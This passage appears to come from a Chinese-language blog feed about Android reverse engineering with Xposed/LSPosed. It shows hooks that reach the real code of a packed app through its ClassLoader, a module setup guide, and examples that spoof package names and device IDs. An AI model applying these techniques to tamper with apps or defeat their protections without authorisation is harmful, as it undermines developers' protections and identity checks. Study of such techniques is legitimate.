class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.luoxposeddemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Application;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LuoHook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;[LuoXposed]&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">if</span> (lpparam.packageName.equals(<span class="string">&quot;com.hay.dreamlover&quot;</span>)) &#123;</span><br><span class="line">            Log.i(TAG, <span class="string">&quot;Enter Hook&quot;</span>);</span><br><span class="line">            <span class="comment">//com.stub.StubApp</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">applicationClazz</span> <span class="operator">=</span> lpparam.classLoader.loadClass(<span class="string">&quot;com.stub.StubApp&quot;</span>);</span><br><span class="line">            XposedHelpers.findAndHookMethod(applicationClazz, <span class="string">&quot;attachBaseContext&quot;</span>, Context.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                    <span class="built_in">super</span>.beforeHookedMethod(param);</span><br><span class="line">                    Log.i(TAG, <span class="string">&quot;Enter com.stub.StubApp.attachBaseContext&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                    <span class="built_in">super</span>.afterHookedMethod(param);</span><br><span class="line">                    Log.i(TAG, <span class="string">&quot;Leave com.stub.StubApp.attachBaseContext&quot;</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> (Context) param.args[<span class="number">0</span>];</span><br><span class="line">                    <span class="comment">//获取真实业务代码的classLoader</span></span><br><span class="line">                    <span class="type">ClassLoader</span> <span class="variable">finalClassLoader</span> <span class="operator">=</span> context.getClassLoader();</span><br><span class="line">                    <span class="type">Class</span> <span class="variable">initActivityClazz</span> <span class="operator">=</span> finalClassLoader.loadClass(<span class="string">&quot;com.fanwe.hybrid.activity.InitActivity&quot;</span>);</span><br><span class="line">                    XposedBridge.hookAllMethods(initActivityClazz, <span class="string">&quot;onCreate&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                            <span class="built_in">super</span>.beforeHookedMethod(param);</span><br><span class="line">                            Log.i(TAG, <span class="string">&quot;attachBaseContext Enter com.fanwe.hybrid.activity.InitActivity.onCreate&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                            <span class="built_in">super</span>.afterHookedMethod(param);</span><br><span class="line">                            Log.i(TAG, <span class="string">&quot;attachBaseContext Leave com.fanwe.hybrid.activity.InitActivity.onCreate&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>上面的方法在厂商对加固过程有改动时, 就需要花费时间对脚本进行修改</p><p>方法二则是一个更通用的解决任意加固应用函数的Hook方式</p><p>回顾app启动相关的知识</p><p>App被Zygote进程孵化后,通过ActivityThread.main函数进入App的世界.</p><p>ActivityThread这个类十分重要,它会根据ActivityManager发送的请求对activities、broadcast Receviers等操作进行调度和执行.</p><p>其中performLaunchActivity()函数用于响应Activity相关的操作.</p><p>另外ActivityThread类中还存在着一个Application类型的mInitialApplication成员,应用程序中有且只有一个Application组件,而Application对象中就存储着当前的ClassLoader,考虑到App在响应Activity消息时,真实App的代码已经被释放到内存中,此时通过mInitialApplication成员获取应用当前的ClassLoader,即可完成对真实App业务代码的Hook.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.luoxposeddemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Application;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LuoHook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;[LuoXposed]&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">if</span> (lpparam.packageName.equals(<span class="string">&quot;com.hay.dreamlover&quot;</span>)) &#123;</span><br><span class="line">            Log.i(TAG, <span class="string">&quot;Enter Hook&quot;</span>);</span><br><span class="line">            <span class="type">Class</span> <span class="variable">activityThreadClazz</span> <span class="operator">=</span> lpparam.classLoader.loadClass(<span class="string">&quot;android.app.ActivityThread&quot;</span>);</span><br><span class="line">            XposedBridge.hookAllMethods(activityThreadClazz, <span class="string">&quot;performLaunchActivity&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                    <span class="built_in">super</span>.beforeHookedMethod(param);</span><br><span class="line">                    Log.i(TAG, <span class="string">&quot;Enter android.app.ActivityThread.performLaunchActivity&quot;</span>);</span><br><span class="line">                    </span><br><span class="line">                    <span class="type">Application</span> <span class="variable">mInitialApplication</span> <span class="operator">=</span> (Application) XposedHelpers.getObjectField(param.thisObject, <span class="string">&quot;mInitialApplication&quot;</span>);</span><br><span class="line">                    <span class="type">ClassLoader</span> <span class="variable">finalClassLoader</span> <span class="operator">=</span> mInitialApplication.getClassLoader();</span><br><span class="line">                    <span class="type">Class</span> <span class="variable">initActivityClazz</span> <span class="operator">=</span> finalClassLoader.loadClass(<span class="string">&quot;com.fanwe.hybrid.activity.InitActivity&quot;</span>);</span><br><span class="line">                    <span class="comment">//Log.i(TAG, initActivityClazz.toString());</span></span><br><span class="line">                    XposedBridge.hookAllMethods(initActivityClazz, <span class="string">&quot;onCreate&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                            <span class="built_in">super</span>.beforeHookedMethod(param);</span><br><span class="line">                            Log.i(TAG, <span class="string">&quot;performLaunchActivity Enter com.fanwe.hybrid.activity.InitActivity.onCreate&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                            <span class="built_in">super</span>.afterHookedMethod(param);</span><br><span class="line">                            Log.i(TAG, <span class="string">&quot;performLaunchActivity Leave com.fanwe.hybrid.activity.InitActivity.onCreate&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                    <span class="built_in">super</span>.afterHookedMethod(param);</span><br><span class="line">                    Log.i(TAG, <span class="string">&quot;Leave android.app.ActivityThread.performLaunchActivity&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">xposed</summary>
    
    
    
    <category term="bin" scheme="https://ixout.github.io/categories/bin/"/>
    
    
    <category term="xposed" scheme="https://ixout.github.io/tags/xposed/"/>
    
  </entry>
  
  <entry>
    <title>xposed入门: FDex2源码分析与实战登山赛车</title>
    <link href="https://ixout.github.io/posts/32540/"/>
    <id>https://ixout.github.io/posts/32540/</id>
    <published>2024-10-26T03:19:11.000Z</published>
    <updated>2025-04-06T12:57:54.906Z</updated>
    
    <content type="html"><![CDATA[<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><h2 id="lsposed"><a href="#lsposed" class="headerlink" title="lsposed"></a>lsposed</h2><p>xposed仅支持到android 7.0版本, 在更高的版本有许多替代, 最常用的便是lsposed</p><div class="table-container"><table><thead><tr><th>特性</th><th>Xposed</th><th>LSPosed</th></tr></thead><tbody><tr><td><strong>Hook 方式</strong></td><td>直接 Hook <code>Zygote</code> 进程</td><td>通过 Magisk / Riru 注入 <code>Zygote</code></td></tr><tr><td><strong>兼容性</strong></td><td>旧版 Android（7.0-10.0）</td><td>适用于 Android 8.0+</td></tr><tr><td><strong>模块管理</strong></td><td>需要 Xposed Installer</td><td>需要 LSPosed Manager</td></tr><tr><td><strong>性能影响</strong></td><td>修改系统 <code>Zygote</code>，易损坏</td><td>仅 Hook 选定进程，更稳定</td></tr><tr><td><strong>安全性</strong></td><td>易被检测（如 SafetyNet）</td><td>更隐蔽，适用于新版本 Android</td></tr></tbody></table></div><p>不过二者模块是几乎完全兼容的, 语法什么的都差不多</p><h2 id="magisk"><a href="#magisk" class="headerlink" title="magisk"></a>magisk</h2><p>lsposed需要magisk配合才能使用</p><h2 id="android-studio"><a href="#android-studio" class="headerlink" title="android studio"></a>android studio</h2><p>android开发必备</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h2 id="xposed"><a href="#xposed" class="headerlink" title="xposed"></a>xposed</h2><h1 id="模块init"><a href="#模块init" class="headerlink" title="模块init"></a>模块init</h1><ol><li><p>android studio创建一个新项目</p></li><li><p>在main目录下新增一个libs目录, 将XposedBridge.jar放入, 放入后右击选择<code>Add As Library</code>(注: 该依赖也可以通过在线导入)</p></li><li><p>到build.gradle中将上一步在dependencies对应产生的引入依赖语句中的<code>implementation</code> 改为 <code>compileOnly</code></p></li><li><p>在main目录下新增<code>assets</code>目录, 其中新建文件<code>xposed_init</code>, 添加一行内容<code>包名.xposed入口类名</code></p></li><li><p>在main目录下新增<code>/res/values</code>目录, 创建文件<code>arrays.xml</code>, 用于管理模块作用域</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string-array</span> <span class="attr">name</span>=<span class="string">&quot;xposedscope&quot;</span> &gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 这里填写模块的作用域应用的包名，可以填多个。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">item</span>&gt;</span>ceui.lisa.pixiv<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">item</span>&gt;</span>com.xjs.ehviewer<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">item</span>&gt;</span>com.picacomic.fregata<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">string-array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>修改<code>AndroidManifest.xml</code>在\<application>标签中新增内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">application</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- other information here --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 表明这是一个xposed模块, xposed通过这个标识识别模块, 不得更改 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;xposedmodule&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:value</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">     <span class="comment">&lt;!-- 模块描述 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;xposeddescription&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:value</span>=<span class="string">&quot;Easy example which makes the status bar clock red and adds a smiley&quot;</span> /&gt;</span></span><br><span class="line">     <span class="comment">&lt;!-- 最低要求xposed版本, 根据导入的xposed版本填 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;xposedminversion&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:value</span>=<span class="string">&quot;82&quot;</span> /&gt;</span></span><br><span class="line">     <span class="comment">&lt;!-- 模块作用域 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:name</span>=<span class="string">&quot;xposedscope&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:resource</span>=<span class="string">&quot;@array/xposedscope&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="文档速览"><a href="#文档速览" class="headerlink" title="文档速览"></a>文档速览</h1><p><a href="https://api.xposed.info/">https://api.xposed.info/</a></p><p>快速过一遍文档中常用部分</p><h2 id="XC-MethodHook"><a href="#XC-MethodHook" class="headerlink" title="XC_MethodHook"></a>XC_MethodHook</h2><p>钩子回调类, 进行hook时一般需要创建该类的匿名子类</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-10_204742.png" alt=""></p><h3 id="MethodHookParam"><a href="#MethodHookParam" class="headerlink" title="MethodHookParam"></a>MethodHookParam</h3><p>封装关于方法调用的信息, 也就是回hook的参数</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-10_204718.png" alt=""></p><h2 id="XposedBridge"><a href="#XposedBridge" class="headerlink" title="XposedBridge"></a>XposedBridge</h2><p>提供与 Xposed 框架交互的核心方法</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-10_203953.png" alt=""></p><h2 id="XposedHelper"><a href="#XposedHelper" class="headerlink" title="XposedHelper"></a>XposedHelper</h2><p>提供一些实用方法，用于快速hook, 反射和动态操作类、方法、字段等</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-10_204311.png" alt=""></p><h2 id="入口"><a href="#入口" class="headerlink" title="入口"></a>入口</h2><p>Xposed/LSPosed 模块的<strong>入口类</strong>通常需要实现 <strong>Xposed 框架的接口</strong>，用于接收 Hook 事件并执行 Hook 逻辑, 对于一个模块至少应该实现一个该类接口</p><p>主要有四类接口</p><h3 id="IXposedHookLoadPackage"><a href="#IXposedHookLoadPackage" class="headerlink" title="IXposedHookLoadPackage"></a>IXposedHookLoadPackage</h3><p>用于监听应用的加载过程并hook</p><p><strong>重写方法</strong>: <code>handleLoadPackage</code></p><p><strong>参数</strong>:<code>XC_LoadPackage.LoadPackageParam</code></p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-10_201903.png" alt=""></p><p><strong>示例</strong></p><p>注意:当app内存在多个包时, 使用参数lpparam.packageName过滤也只能使用应用包名</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainHook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">if</span> (!lpparam.packageName.equals(<span class="string">&quot;com.target.app&quot;</span>)) <span class="keyword">return</span>; <span class="comment">// 仅 Hook 目标应用</span></span><br><span class="line">        XposedBridge.log(<span class="string">&quot;Hooking: &quot;</span> + lpparam.packageName);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 示例：Hook getPackageName() 方法</span></span><br><span class="line">        XposedHelpers.findAndHookMethod(</span><br><span class="line">            <span class="string">&quot;android.app.Application&quot;</span>, lpparam.classLoader, <span class="string">&quot;getPackageName&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> &#123;</span><br><span class="line">                    param.setResult(<span class="string">&quot;com.fake.package&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="IXposedHookInitPackageResources"><a href="#IXposedHookInitPackageResources" class="headerlink" title="IXposedHookInitPackageResources"></a>IXposedHookInitPackageResources</h3><p>监听资源加载并hook, 用于修改目标应用的 UI 资源，例如替换图片、修改文本等</p><p><strong>重写方法</strong>: <code>handleInitPackageResources</code></p><p><strong>参数</strong>:<code>XC_InitPackageResources.InitPackageResourcesParam</code></p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-10_202207.png" alt=""></p><p><strong>示例:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookInitPackageResources;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_InitPackageResources;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ResourceHook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookInitPackageResources</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleInitPackageResources</span><span class="params">(XC_InitPackageResources.InitPackageResourcesParam resparam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">if</span> (!resparam.packageName.equals(<span class="string">&quot;com.target.app&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 替换字符串资源（如修改 App 标题）</span></span><br><span class="line">        resparam.res.setReplacement(<span class="string">&quot;com.target.app&quot;</span>, <span class="string">&quot;string&quot;</span>, <span class="string">&quot;app_name&quot;</span>, <span class="string">&quot;Hooked App!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 替换图片资源</span></span><br><span class="line">        resparam.res.setReplacement(<span class="string">&quot;com.target.app&quot;</span>, <span class="string">&quot;drawable&quot;</span>, <span class="string">&quot;app_icon&quot;</span>, XposedHelpers.findSystemClass(<span class="string">&quot;com.myhook.module.R.drawable.new_icon&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="IXposedHookZygoteInit"><a href="#IXposedHookZygoteInit" class="headerlink" title="IXposedHookZygoteInit"></a>IXposedHookZygoteInit</h3><p><strong>系统启动时</strong> 进行 Hook，影响所有应用</p><p><strong>重写方法</strong>:<code>initZygote</code></p><p><strong>参数</strong>:<code>StartupParam</code></p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-10_202526.png" alt=""></p><p><strong>示例</strong>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookZygoteInit;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ZygoteHook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookZygoteInit</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initZygote</span><span class="params">(StartupParam startupParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        XposedBridge.log(<span class="string">&quot;Zygote Hook Initialized!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Hook 所有应用的 getDeviceId()</span></span><br><span class="line">        XposedHelpers.findAndHookMethod(</span><br><span class="line">            <span class="string">&quot;android.telephony.TelephonyManager&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;getDeviceId&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> &#123;</span><br><span class="line">                    param.setResult(<span class="string">&quot;000000000000000&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="接口组合"><a href="#接口组合" class="headerlink" title="接口组合"></a>接口组合</h3><p>在一个 Xposed 模块中，可以同时实现多个 Hook 接口，例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> de.robv.android.xposed.*;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainHook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span>, IXposedHookInitPackageResources &#123;</span><br><span class="line">    <span 